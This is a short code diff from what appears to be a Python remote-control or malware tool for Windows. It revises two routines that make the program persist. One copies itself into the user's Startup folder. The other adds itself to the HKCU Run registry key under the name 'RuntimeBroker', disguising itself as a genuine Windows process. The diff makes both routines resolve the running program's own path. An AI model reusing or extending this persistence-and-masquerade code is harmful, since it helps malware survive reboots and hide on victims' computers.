@@ -1,5 +1,7 @@
+import os
 import shutil
 import subprocess
+import sys
 import time
 import winreg
 import win32console
@@ -103,7 +105,8 @@ def get_all_services_cmd(message):
 
 def add_to_startup_1():
     try:
-        shutil.copy(__file__, f"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
+        script_path = os.path.abspath(sys.argv[0])
+        shutil.copy(script_path, f"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
         return "Add to startup folder Success"
     except Exception as e: return f"Error in add_to_startup_1(): {e}"
 
@@ -111,7 +114,8 @@ def add_to_startup_2():
     try:
         key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
         key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
-        SetValueEx(key2change, "RuntimeBroker", 0, REG_SZ, __file__)
+        script_path = os.path.abspath(sys.argv[0])
+        SetValueEx(key2change, "RuntimeBroker", 0, REG_SZ, script_path)
     except Exception as e: return f"Error occured in add_to_startup_2(): {e}"
     return "Successfully added startup regkey"
 
